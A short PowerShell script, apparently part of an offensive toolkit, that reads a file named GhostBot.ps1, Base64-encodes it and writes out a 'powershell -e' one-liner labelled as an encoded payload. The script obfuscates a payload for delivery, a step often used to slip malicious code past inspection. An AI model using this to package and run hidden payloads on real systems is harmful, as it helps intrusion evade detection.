param([string]$PayloadPath = ".\agent\GhostBot.ps1")

$content = Get-Content $PayloadPath -Raw
$bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
$encoded = [Convert]::ToBase64String($bytes)

$drop = "powershell -e $encoded"
Set-Content -Path ".\reports\payload_encoded.txt" -Value $drop

Write-Host "[💉] Payload created & encoded." -ForegroundColor Green
